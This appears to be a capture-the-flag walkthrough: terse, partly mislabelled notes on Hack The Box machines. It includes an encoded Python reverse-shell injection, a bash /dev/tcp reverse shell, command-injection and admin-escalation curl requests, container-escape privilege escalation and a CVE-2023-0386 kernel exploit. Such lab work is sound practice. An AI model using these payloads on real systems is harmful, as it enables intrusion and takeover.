## Table of Contents

- [MonitorsTwo (HTB)](#monitorstwo\(htb))
- [2Million (HTB)](#2million\(htb))

SSRF vulnerbility
nmap -A -sC -sV -T4 $ip -oN sau.scan

on the webpage(55555) 

to trigger the SSRF-> 

set up a path for the basket by clicking on the settings button.
(path -> http://127.0.0.1:80/)
set extend forward path on + proxy response

trigger the vuln by going to http://MACHINE_IP:55555/basketName

mailtrail has unauthenticated OS command injection, base64 encode a python reverse shell one-liner then run the unauth rce exploit>
curl 'http://10.10.11.224:55555/htb/login' --data 'username=;`echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjQiLDY5NjkpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIikn | base64 -d | bash`'

after running linpeas etc>>

sudo /usr/bin/systemctl status trail.service

!sh

root!

# MonitorsTwo (HTB)






# 2Million (HTB)
1. Nmap 
2. Search for CVE for Cacti 1.2.2
3. get shell using exploit
4. enumerate
5. cat entrypoint.sh and dockerenv
6. find sql db creds
7. enumerate db
8. ./capsh --gid=0 --uid=0 --
9. mysql --host=db --user=root cacti -e "SELECT * FROM user_auth"
10. find creds to ssh using marcus' account. 
11. crack bcrypt hash using hashcat -m 3200
12. ssh using marcus
13. priv esc
14. back to shell
15. chmod u+s /bin/bash
16. findmnt
17. ls -la /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
18. /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
19. root!
20. make account
21. enumerate endpoints with the PHPSESSID
22. curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"email":"test@2million.htb", "is_admin": true}' | jq
23. curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;id;"}' uid=33(www-data) gid=33(www-data) groups=33(www-data)
24. bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
25. rev shell!. 

To use CVE-2023-0386:
git clone https://github.com/xkaneiki/CVE-2023-0386
cd CVE-2023-0386
make all
./fuse ./ovlcap/lower ./gc &

Then execute the exp binary in the foreground
./exp

Root!
